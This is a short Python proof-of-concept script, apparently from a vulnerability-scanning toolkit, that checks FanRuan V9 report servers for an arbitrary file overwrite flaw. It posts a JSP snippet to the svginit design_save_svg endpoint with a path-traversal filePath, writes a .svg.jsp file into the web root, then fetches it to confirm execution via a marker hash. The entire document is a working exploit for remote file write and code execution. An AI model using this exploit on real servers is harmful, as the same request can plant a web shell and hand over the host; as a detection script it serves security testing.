import httpx
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
}

def poc(target):
    try:
        target = get_standard_url(target)
        data = {"__CONTENT__":"<%out.println(\"202cb962ac59075b964b07152d234b70\");%>",
                "__CHARSET__":"UTF-8"}
        res1 = httpx.post(target + '/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp',headers=headers,data=data)
        # 获取文件内容
        res2 = httpx.get(target + '/WebReport/a.svg.jsp')
        if "202cb962ac59075b964b07152d234b70" in res2.text and res2.status_code == 200:
            print("\033[0;31m 存在帆软 V9 任意文件覆盖文件上传：" + target)
    except:
        pass


